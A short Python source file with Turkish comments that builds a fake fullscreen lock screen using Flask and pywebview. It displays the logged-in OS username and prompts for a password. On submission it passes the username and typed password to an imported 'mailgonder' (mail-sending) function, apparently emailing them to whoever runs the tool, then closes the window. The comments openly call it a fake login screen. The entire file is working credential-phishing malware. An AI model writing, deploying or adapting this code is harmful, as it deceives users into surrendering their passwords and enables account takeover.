from flask import Flask, render_template, request
from mailgonder import mailgonder
from time import sleep
import webview
import os

# frontendi işlevsel hale getirecek backend serverı flask ile oluşturuyoruz
server = Flask(__name__, static_folder='./assets', template_folder='./templates')

# program çalıştığında doğrudan istek attığı nokta olan root endpointine
# html css ve js dosyalarından oluşan sahte giriş ekranı frontendini render ediyoruz
# bu aşamada kullanıcı adı da toplanıp renderlanmak üzere dicte ekleniyor
@server.route('/')
def index():

    data = {
        "username" : os.getlogin()
    }

    return render_template('index.html', data=data)

# kullanıcı şifresini girip giriş butonuna bastığında bu endpointe post requesti atıyor
# bu aşamada ilk olarak frontend penceresini kapatıyoruz
# ardından kullanıcı adı ve şifreyi mailgonder fonksiyonuna gönderiyoruz

@server.route('/login', methods=["POST"])
def login():
    user = os.getlogin()
    pwd = request.json['password']
    mailgonder(user,pwd)
    webview.windows[0].destroy()
    return "OK"


# webview kütüphanesi ile oluşturduğumuz serverı başlatıyoruz
# fullscreen parametresi ile pencerenin tam ekran olmasını sağlıyoruz
webview.create_window('ekrankilidi', server, fullscreen=True)
webview.start()